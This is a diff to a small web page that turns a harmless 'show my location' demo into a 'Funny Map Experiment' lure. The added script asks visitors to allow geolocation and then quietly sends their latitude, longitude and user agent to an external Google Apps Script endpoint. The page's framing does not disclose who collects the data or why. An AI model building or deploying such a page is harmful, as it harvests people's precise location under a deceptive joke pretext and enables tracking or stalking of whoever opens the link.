@@ -1,17 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Live Map Tracker</title>
+  <title>Funny Map Experiment 😂</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    .success {
+      color: green;
+    }
+    .error {
+      color: red;
+    }
+  </style>
 </head>
 <body>
-  <h2>Checking your live map zone...</h2>
+  <h1>😜 Funny Map Experiment</h1>
+  <p>Tap “Allow” to see your real-time location!</p>
+  <p id="status">Requesting location...</p>
   <script>
-    navigator.geolocation.getCurrentPosition(function(position) {
-      alert("📍 You are here:\nLatitude: " + position.coords.latitude + 
-            "\nLongitude: " + position.coords.longitude);
-    }, function(error) {
-      alert("Location access denied or unavailable.");
-    });
+    function sendLocation(lat, lon) {
+      fetch("https://script.google.com/macros/s/AKfycbw9qFm0UFnu3eengU-c21xnMyiwCRy8_b9JWN8bZL7eGZxzfOWsfl-mHAXoU7UHNRMD/exec", {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon,
+          userAgent: navigator.userAgent
+        })
+      });
+    }
+
+    function success(pos) {
+      const crd = pos.coords;
+      document.getElementById("status").innerHTML = `<span class='success'>Location sent: ${crd.latitude}, ${crd.longitude}</span>`;
+      sendLocation(crd.latitude, crd.longitude);
+    }
+
+    function error(err) {
+      document.getElementById("status").innerHTML = `<span class='error'>ERROR: ${err.message}</span>`;
+    }
+
+    navigator.geolocation.getCurrentPosition(success, error);
   </script>
 </body>
 </html>
